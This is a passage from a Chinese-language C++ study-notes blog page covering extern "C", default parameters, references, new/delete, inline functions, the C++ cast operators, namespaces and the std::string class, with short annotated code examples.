c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus  <span class="comment">//判断是否是c++环境</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;c&quot;</span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">...  <span class="comment">// 对c的标准库函数声明，不倾轧</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="默认参数default-parameters"><a class="markdownIt-Anchor" href="#默认参数default-parameters"></a> 默认参数(default parameters)</h2><ul><li>通常情况下，函数在调用时，形参从实参那里取得值。对于多次调用用一函数同一实参时，<code>C++</code>给出了更简单的处理办法。给形参以默认值，这样就不用从实参那里取值了。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">volume</span><span class="params">(<span class="keyword">float</span> length, <span class="keyword">float</span> weight = <span class="number">4</span>,<span class="keyword">float</span> high = <span class="number">5</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> length*weight*high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>规则<ol><li>默认的顺序，是从右向左，不能跳跃。</li><li>函数声明和定义一体时，默认认参数在定义(声明)处。声明在前，定义在后，默认参数在声明处。</li><li>一个函数，不能既作重载，又作默认参数的函数。当你少写一个参数时，系统无法确认是重载还是默认参数。</li></ol></li></ul><h2 id="引用reference"><a class="markdownIt-Anchor" href="#引用reference"></a> 引用(Reference)</h2><ul><li>变量名，本身是一段内存的引用,即别名(alias)。此处引入的引用，是为己有变量起一个别名。</li><li>引用是一种声明关系，声明时必须初始化，引用不开辟空间。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span> &amp;b = a;  <span class="comment">//b是a的引用</span></span><br></pre></td></tr></table></figure><h3 id="规则"><a class="markdownIt-Anchor" href="#规则"></a> 规则</h3><ol><li>引用没有定义，是一种关系型声明。声明它和原有某一变量(实体)的关系。故而类型与原类型保持一致，<strong>且不分配内存</strong>。与被引用的变量有相同的地址。</li><li>声明的时候必须初始化，一经声明，不可变更。</li><li>可对引用，再次引用。多次引用的结果，是某一变量具有多个别名。</li><li>&amp;符号前有数据类型时，是引用。其它皆为取地址。(变量前面的&amp;是取地址：&amp;a)</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">int</span> &amp;r = a;</span><br><span class="line"><span class="keyword">int</span> &amp;r = b; <span class="comment">//错误，不可更改原有的引用关系</span></span><br><span class="line"><span class="keyword">float</span> &amp;rr = b; <span class="comment">//错误，引用类型不匹配</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;&amp;a&lt;&lt;&amp;r&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//变量与引用具有相同的地址。</span></span><br><span class="line"><span class="keyword">int</span> &amp;ra = r; <span class="comment">//可对引用更次引用，表示 a 变量有两个别名，分别是 r 和 ra</span></span><br></pre></td></tr></table></figure><h3 id="引用的本质"><a class="markdownIt-Anchor" href="#引用的本质"></a> 引用的本质</h3><ul><li>引用的本质是指针，<code>C++</code>对裸露的内存地址(指针)作了一次包装。又取得的指针的优良特性。所以再对引用取地址，建立引用的指针没有意义。</li><li>引用的本质是，是对常指针 type * const p 的再次包装。<code>char &amp;rc == *pc double &amp;rd == *pd</code></li></ul><h3 id="注意点"><a class="markdownIt-Anchor" href="#注意点"></a> 注意点</h3><ol><li>可以定义指针的引用，但不能定义引用的引用。</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span>* p = &amp;a;</span><br><span class="line"><span class="keyword">int</span>*&amp; rp = p; <span class="comment">// ok</span></span><br><span class="line"><span class="keyword">int</span>&amp; r = a;</span><br><span class="line"><span class="keyword">int</span>&amp;&amp; rr = r; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><ol start="2"><li>可以定义指针的指针(二级指针)，但不能定义引用的指针。</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span>* p = &amp;a;</span><br><span class="line"><span class="keyword">int</span>** pp = &amp;p; <span class="comment">// ok</span></span><br><span class="line"><span class="keyword">int</span>&amp; r = a;</span><br><span class="line"><span class="keyword">int</span>&amp;* pr = &amp;r; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><ol start="3"><li>可以定义指针数组，但不能定义引用数组，可以定义数组引用。</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a, b, c;</span><br><span class="line"><span class="keyword">int</span>* parr[] = &#123;&amp;a, &amp;b, &amp;c&#125;; <span class="comment">// ok</span></span><br><span class="line"><span class="keyword">int</span>&amp; rarr[] = &#123;a, b, c&#125;; <span class="comment">// error</span></span><br><span class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> (&amp;rarr)[<span class="number">3</span>] = arr; <span class="comment">// ok，必须是int[3]类型的引用</span></span><br></pre></td></tr></table></figure><ol start="4"><li>常引用：const 引用有较多使用。它可以防止对象的值被随意修改。因而具有一些特性。</li></ol><ul><li><strong>const 对象的引用必须是 const 的</strong>，将普通引用绑定到 const 对象是不合法的。 这个原因比较简单。既然对象是 const 的，表示不能被修改，引用当然也不能修改，必须使用 const 引用。实际上，const int a=1; int &amp;b=a;这种写法是不合法的，编译不过。</li><li><strong>const 引用可使用相关类型的对象(常量,非同类型的变量或表达式)初始化</strong>。这个是const 引用与普通引用最大的区别。const int &amp;a=2;是合法的。double x=3.14; const int&amp;b=a;也是合法的。</li><li>常引用原理：const 引用的目的是，禁止通过修改引用值来改变被引用的对象。const 引用的初始化特性较为微妙，可通过如下代码说明：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">double</span> val = <span class="number">3.14</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp;ref = val; <span class="comment">// int const &amp; int &amp; const ??</span></span><br><span class="line"><span class="keyword">double</span> &amp; ref2 = val;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ref&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ref2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">val = <span class="number">4.14</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ref&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ref2&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><ul><li>上述输出结果为 3 3.14 和 3 4.14。因为 ref 是 const 的，在初始化的过程中已经给定值，不允许修改。而被引用的对象是 val，是非 const 的，所以 val 的修改并未影响 ref的值，而 ref2 的值发生了相应的改变。那么，为什么非 const 的引用不能使用相关类型初始化呢？实际上，const 引用使用相关类型对象初始化时发生了如下过程：<code>int temp = val;const int &amp;ref = temp;</code>如果 ref 不是 const 的，那么改变 ref 值，修改的是 temp，而不是 val。期望对 ref 的赋值会修改 val 的程序员会发现 val 实际并未修改。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> &amp; ref = i+<span class="number">5</span>;</span><br><span class="line"><span class="comment">//此时产生了与表达式等值的无名的临时变量，</span></span><br><span class="line"><span class="comment">//此时的引用是对无名的临时变量的引用。故不能更改。</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ref&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><ol start="5"><li>尽可能使用 const：原因如下：</li></ol><ul><li>使用 const 可以避免无意修改数据的编程错误。</li><li>使用 const 可以处理 const 和非 const 实参。否则将只能接受非 const 数据。</li><li>使用 const 引用，可使函数能够正确的生成并使用临时变量（如果实参与引用参数不匹配，就会生成临时变量）</li></ul><h2 id="newdelete-operator"><a class="markdownIt-Anchor" href="#newdelete-operator"></a> new/delete Operator</h2><ul><li>c 语言中提供了 malloc 和 free 两个系统函数(库:stdlib.h)，完成对堆内存的申请和释放。而 <code>c++</code>则提供了两关键字 new 和 delete ;</li></ul><h3 id="newnew用法"><a class="markdownIt-Anchor" href="#newnew用法"></a> new/new[]用法:</h3><ol><li>开辟单变量地址空间</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>; <span class="comment">//开辟大小为 sizeof(int)空间</span></span><br><span class="line"><span class="keyword">int</span> *a = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">5</span>); <span class="comment">//开辟大小为 sizeof(int)空间，并初始化</span></span><br><span class="line"><span class="comment">//类型转换</span></span><br><span class="line">c:   <span class="keyword">int</span> *p = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">c++:  <span class="keyword">int</span> *p = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>*&gt;(<span class="built_in">malloc</span>(size(<span class="keyword">int</span>)));</span><br></pre></td></tr></table></figure><ol start="2"><li>开辟数组空间</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">一维: <span class="keyword">int</span> *a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100</span>]&#123;<span class="number">0</span>&#125;;开辟一个大小为 <span class="number">100</span> 的整型数组空间</span><br><span class="line">初始化：<span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>[<span class="number">100</span>]));</span><br><span class="line">指针数组：<span class="keyword">int</span> **p = <span class="keyword">new</span> <span class="keyword">int</span>*[<span class="number">5</span>]&#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">二维: <span class="keyword">int</span> (*a)[<span class="number">6</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>][<span class="number">6</span>]&#123;&#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">三维: <span class="keyword">int</span> (*a)[<span class="number">5</span>][<span class="number">6</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>][<span class="number">5</span>][<span class="number">6</span>]&#123;&#123;&#123;<span class="number">0</span>&#125;&#125;&#125;;</span><br><span class="line">四维维及其以上:依此类推.</span><br></pre></td></tr></table></figure><h3 id="delete-delete用法"><a class="markdownIt-Anchor" href="#delete-delete用法"></a> delete /delete[]用法:</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. int *a = new int;</span></span><br><span class="line"><span class="keyword">delete</span> a; <span class="comment">//释放单个 int 的空间</span></span><br><span class="line"><span class="comment">//2.int *a = new int[5];</span></span><br><span class="line"><span class="keyword">delete</span> []a; <span class="comment">//释放 int 数组空间</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c 语言版本</span></span><br><span class="line"><span class="keyword">char</span> *ps = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span>(ps == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="comment">//C++ 内存申请失败会抛出异常</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">const</span> <span class="built_in">std</span>::bad_alloc e) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//C++ 内存申请失败不抛出异常版本</span></span><br><span class="line"><span class="keyword">int</span> *q = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow)<span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">if</span>(q == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><h3 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项"></a> 注意事项</h3><ol><li>new/delete 是关键字，效率高于 malloc 和 free.</li><li>配对使用，避免内存泄漏和多重释放。</li><li>避免，交叉使用。比如 malloc 申请的空间去 delete，new 出的空间被 free;</li></ol><h2 id="内联函数inline-function"><a class="markdownIt-Anchor" href="#内联函数inline-function"></a> 内联函数(inline function)</h2><ul><li>c 语言中有宏函数的概念。宏函数的特点是内嵌到调用代码中去，避免了函数调用的开销。但是由于宏函数的处理发生在预处理阶段，缺失了语法检测和有可能带来的语意差错。例如传入<code>i++</code>。</li><li><code>C++</code>提供了 inline 关键字，实现了真正的内嵌。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//宏优点：内嵌代码，辟免压栈与出栈的开销</span></span><br><span class="line"><span class="comment">//缺点: 代码替换，易使生成代码体积变大，易产生逻辑错误，无类型检查</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SQR(x) ((x)*(x))</span></span><br><span class="line"><span class="comment">//函数优点：高度抽象，避免重复开发，类型检查</span></span><br><span class="line"><span class="comment">//缺点: 压栈与出栈，带来开销</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sqr</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;  <span class="comment">//内联函数集合了宏和函数的优点</span></span><br><span class="line">  <span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(i&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%d\n&quot;,SQR(i++));</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,sqr(i++));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>内联的优缺点<ul><li>优点：避免调用时的额外开销（入栈与出栈操作）</li><li>代价：由于内联函数的函数体在代码段中会出现多个“副本”，因此会增加代码段的空间。</li><li>本质：以牺牲代码段空间为代价，提高程序的运行时间的效率。</li><li>适用场景：函数体很“小”，且被“频繁”调用</li><li>编译器会根据内联函数的代码数量，决定是否内联；但是不声明内联的函数不会自动内联。</li></ul></li></ul><h2 id="类型强转type-cast"><a class="markdownIt-Anchor" href="#类型强转type-cast"></a> 类型强转(type cast)</h2><ul><li>类型转换有 c 风格的，当然还有 <code>c++</code>风格的。c 风格的转换的格式很简单（TYPE EXPRESSION)，但是 c 风格的类型转换有不少的缺点，有的时候用 c 风格的转换是不合适的，因为它可以在任意类型之间转换，比如你可以把一个指向 const 对象的指针转换成指向非const 对象的指针，把一个指向基类对象的指针转换成指向一个派生类对象的指针，这两种转换之间的差别是巨大的，但是传统的 c 语言风格的类型转换没有区分这些。还有一个缺点就是，c 风格的转换不容易查找，他由一个括号加上一个标识符组成，而这样的东西在 <code>c++</code>程序里一大堆。所以 <code>c++</code>为了克服这些缺点，引进了新的类型转换操作符</li></ul><h3 id="静态类型转换"><a class="markdownIt-Anchor" href="#静态类型转换"></a> 静态类型转换</h3><ul><li>语法格式：<code>static_cast&lt;目标类型&gt; (标识符)</code></li><li>转化规则：在一个方向上可以作隐式转换，在另外一个方向上就可以作静态转换。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">a=b;b=a; <span class="comment">//两个相互可以隐式转换，此时两个方向都可以静态转换</span></span><br><span class="line">b=<span class="keyword">static_cast</span>&lt;<span class="keyword">float</span>&gt;(a); </span><br><span class="line">a=<span class="keyword">static_cast</span>&lt;<span class="keyword">float</span>&gt;(b); <span class="comment">//float = int int = float</span></span><br><span class="line"><span class="keyword">int</span> *p; <span class="keyword">void</span> *q;</span><br><span class="line">q = p; <span class="comment">// void*可以等于int*，但是反过来不可以，需要强制转换</span></span><br><span class="line">p = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>*&gt;(q);</span><br><span class="line"><span class="keyword">char</span> *p = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="built_in">malloc</span>(<span class="number">100</span>)); <span class="comment">//malloc开辟的void*变量，强转为char*</span></span><br></pre></td></tr></table></figure><h3 id="重解释类型转换"><a class="markdownIt-Anchor" href="#重解释类型转换"></a> 重解释类型转换</h3><ul><li>语法格式：<code>reinterpret_cast&lt;目标类型&gt; (标识符)</code></li><li>转化规则：“通常为操作数的位模式提供较低层的重新解释”也就是说将数据以二进制存在形式的重新解释，在双方向上都不可以隐式类型转换的，则需要重解释类型转换。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *p; <span class="keyword">int</span> *q;</span><br><span class="line">p = q;q = p;  <span class="comment">//两个类型之间无法相互隐式转化</span></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0x12345648</span>;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(&amp;x);</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *q = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span>*&gt;((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span>&gt;(a) +<span class="number">1</span>));</span><br></pre></td></tr></table></figure><h3 id="脱常类型转换"><a class="markdownIt-Anchor" href="#脱常类型转换"></a> (脱)常类型转换</h3><ul><li>语法格式：<code>const_cast&lt;目标类型&gt; (标识符)</code>，<font color="blue">目标类类型只能是指针或引用</font></li><li>转化规则：用来移除对象的常量性(cast away the constness)使用 const_cast 去除 const 限定的目的不是为了修改它的内容，而通常是为了函数能够接受这个实际参数。</li><li>可以改变 const 自定义类的成员变量，但是对于内置数据类型，却表现未定义行为。</li></ul><blockquote><p>CSDN：Depending on the type of the referenced object, a write operation through the resulting pointer, reference, or pointer to data member might produce undefined behavior.</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//应用场景 1：</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> &amp; ref)</span></span>&#123;&#125; <span class="comment">//参数为const类型引用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> &amp; ref)</span></span>&#123;&#125; <span class="comment">//别人己经写好的程序或类库</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> m = <span class="number">44</span>;</span><br><span class="line">func0(m);<span class="comment">//可以传入，同时不能更改</span></span><br><span class="line">func(<span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>&amp;&gt;(m)); <span class="comment">//将m脱const，传入参数是引用的类库</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//脱掉 const 后的引用或指针可以改吗？const变量一定不能改</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> x = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">int</span> &amp; a =<span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>&amp;&gt;(x); <span class="comment">// int &amp;a = x;  脱常转为引用</span></span><br><span class="line">a = <span class="number">300</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;---&quot;</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;&amp;x&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//地址相同，值不同</span></span><br><span class="line"><span class="keyword">int</span> *p =<span class="keyword">const_cast</span>&lt;<span class="keyword">int</span>*&gt;(&amp;x); <span class="comment">// int *p = &amp;x;脱常转为指针</span></span><br><span class="line">*p = <span class="number">400</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;*p&lt;&lt;<span class="string">&quot;---&quot;</span>&lt;&lt;&amp;x&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;p&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//地址相同，值不同</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span> &#123;</span><span class="keyword">int</span> data;&#125;;</span><br><span class="line"><span class="keyword">const</span> A xx = &#123;<span class="number">1111</span>&#125;;  <span class="comment">//复杂类型的常量</span></span><br><span class="line">A &amp;a1 = <span class="keyword">const_cast</span>&lt; A&amp;&gt;(xx);a1.data = <span class="number">222</span>;  </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a1.data&lt;&lt;xx.data&lt;&lt;<span class="built_in">endl</span>;   <span class="comment">//地址变化了，值同步更改了</span></span><br><span class="line">A *p1 = <span class="keyword">const_cast</span>&lt;A*&gt;(&amp;xx);p1-&gt;data = <span class="number">333</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;p1-&gt;data&lt;&lt;xx.data&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><ul><li>const补充：宏在预处理阶段替换了所有宏，而const变量是在编译阶段替换了所有变量。const永远不去改变。</li></ul><h3 id="动态类型转换"><a class="markdownIt-Anchor" href="#动态类型转换"></a> 动态类型转换</h3><ul><li>语法格式：<code>dynamic_cast&lt;目标类型&gt; (标识符)</code></li><li>转化规则：用于多态中的父子类之间的强制转化</li></ul><h2 id="命名空间namespace-scope"><a class="markdownIt-Anchor" href="#命名空间namespace-scope"></a> 命名空间(namespace scope)</h2><ul><li>命名空间为了大型项目开发，而引入的一种避免命名冲突的一种机制。比如说，在一个大型项目中，要用到多家软件开发商提供的类库。在事先没有约定的情况下，两套类库可能在存在同名的函数或是全局变量而产生冲突。项目越大，用到的类库越多，开发人员越多，这种冲突就会越明显。</li></ul><h3 id="默认namespace"><a class="markdownIt-Anchor" href="#默认namespace"></a> 默认NameSpace</h3><ul><li>全局<code>Global scope</code>是一个程序中最大的 scope。也是引起命名冲突的根源。C 语言没有从语言层面提供这种机制来解决。也算是 C 语言的硬伤了。<code>Global scope</code>是无名的命名空间，命名空间为空。<code>c++</code>的作用域运算符：<code>::</code>。所以全局的命名空间直接用<code>::</code>即可表示。</li><li>局部<code>Function scope</code>就是函数作用域，就没有命名空间的概念了。直接使用函数内声明的变量即可。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">::a = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法</h3><ul><li>NameSpace 是对全局(Global scope)区域的再次划分</li></ul><h4 id="声明"><a class="markdownIt-Anchor" href="#声明"></a> 声明</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> NAMESPACE空间名称</span><br><span class="line">&#123;</span><br><span class="line"> 全局变量 <span class="keyword">int</span> a;</span><br><span class="line"> 数据类型 <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span>&#125;;</span><br><span class="line"> 函数 <span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>;</span><br><span class="line"> 其它命名空间 <span class="keyword">namespace</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h4><ol><li>直接指定 命名空间：<code>Space::a = 5;</code>，直接调用</li><li>使用 using+命名空间+空间元素：<code>using Space::a; a = 2000;</code>，取出其中一个</li><li>使用 using +namespace+命名空间： <code>using namespace Space;</code>，都取出来</li></ol><blockquote><p>全取出来虽然方便，但是可能会与局部的同名变量发生冲突。</p></blockquote><h4 id="支持嵌套"><a class="markdownIt-Anchor" href="#支持嵌套"></a> 支持嵌套</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> MySpace</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">int</span> y = <span class="number">2</span>;</span><br><span class="line"> <span class="keyword">namespace</span> Other &#123;</span><br><span class="line">  <span class="keyword">int</span> m = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">int</span> n = <span class="number">4</span>;</span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> MySpace::Other;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><h4 id="协作开发"><a class="markdownIt-Anchor" href="#协作开发"></a> 协作开发</h4><ul><li>同名命名空间自动合并，对于一个命名空间中的类，要包含声明和实现。</li></ul><h2 id="系统-string-类"><a class="markdownIt-Anchor" href="#系统-string-类"></a> 系统 string 类</h2><ul><li>除了使用字符数组来处理字符串以外，c++引入了字符串类型。可以定义字符串变量。</li><li>在<code>&lt;iostream&gt;</code>std命名空间中</li></ul><h3 id="定义及初始化"><a class="markdownIt-Anchor" href="#定义及初始化"></a> 定义及初始化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> str;</span><br><span class="line">str = <span class="string">&quot;china&quot;</span>;  <span class="comment">//初始化方式1</span></span><br><span class="line"><span class="built_in">string</span> str2 = <span class="string">&quot; is great &quot;</span>;<span class="comment">//初始化方式2</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">str3</span><span class="params">(str2)</span></span>;<span class="comment">//初始化方式3</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;str&lt;&lt;str2&lt;&lt;<span class="built_in">endl</span>&lt;&lt;str3&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><h3 id="类型大小"><a class="markdownIt-Anchor" href="#类型大小"></a> 类型大小</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> str;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;sizeof(string) = &quot;</span>&lt;&lt;<span class="keyword">sizeof</span>(<span class="built_in">string</span>)&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//4</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;sizeof(str) = &quot;</span>&lt;&lt;<span class="keyword">sizeof</span>(str)&lt;&lt;<span class="built_in">endl</span>;     <span class="comment">//4</span></span><br></pre></td></tr></table></figure><h3 id="常用运算"><a class="markdownIt-Anchor" href="#常用运算"></a> 常用运算</h3><table><thead><tr><th>操作</th><th>示例</th></tr></thead><tbody><tr><td>赋值</td><td><code>string str3 = str2;</code></td></tr><tr><td>加法</td><td><code>string combine = str + str2;</code></td></tr><tr><td>大小</td><td><code>str3.size()</code></td></tr><tr><td>关系</td><td><code>string s1 = &quot;abcdeg&quot;;string s2 = &quot;12345&quot;;</code><br><code>if(s1&gt;s2)</code><br><code>cout&lt;&lt;&quot;s1&gt;s2&quot;&lt;&lt;endl;</code></td></tr><tr><td>减法没有重载</td><td><code>string s3 = s1-s2; // error</code></td></tr></tbody></table><h3 id="常见的成员函数"><a class="markdownIt-Anchor" href="#常见的成员函数"></a> 常见的成员函数</h3><table><thead><tr><th>操作</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td>下标操作</td><td><code>char &amp; operator[](int n) ;</code></td><td></td></tr><tr><td>求串大小</td><td><code>int size();</code></td><td></td></tr><tr><td>返回 c 串</td><td><code>char *c_str();</code></td><td>与字符数组之间操作，需要返回c串</td></tr><tr><td>查找</td><td><code>int find(char c, int pos = 0);</code><br><code>int find(char * s, int pos = 0);</code></td><td>返回下标值，没有找到返回-1，默认从 0 下标开找</td></tr><tr><td>删除</td><td><code>string &amp;erase(int idx=0，int n = npos);</code></td><td>作用是删除从 idx 开始，往后数 n 位的字符串。</td></tr><tr><td>交换 swap</td><td><code>void swap(stirng &amp;s2);</code></td><td></td></tr></tbody></table><h3 id="string-类型数组"><a class="markdownIt-Anchor" href="#string-类型数组"></a> string 类型数组</h3><ul><li>string 数组是高效的，如果用二维数组来存入字符串数组的话，则容易浪费空间，此时列数是由最长的字符串决定。如果用二级指针申请堆空间，依据大小申请相应的空间，虽然解决了内存浪费的问题，但是操作麻烦。用 string 数组存储，字符串数组的话，效率即高又灵活。</li></ul><figure 